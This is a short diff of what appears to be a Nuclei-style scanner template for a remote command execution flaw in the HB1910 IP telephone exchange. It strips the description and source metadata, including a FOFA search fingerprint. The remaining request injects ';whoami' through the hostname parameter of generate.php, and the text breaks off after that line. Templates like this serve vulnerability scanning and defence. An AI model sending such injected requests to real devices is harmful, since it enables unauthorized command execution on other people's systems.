@@ -3,12 +3,8 @@ info:
   name: HB1910数字IP程控交换机generate.php存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: rce,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: body="themes/tenant/css/login.css"
 http:
 - raw:
   - 'GET /modules/ping/generate.php?send=Ping&hostname=;whoami HTTP/1.1
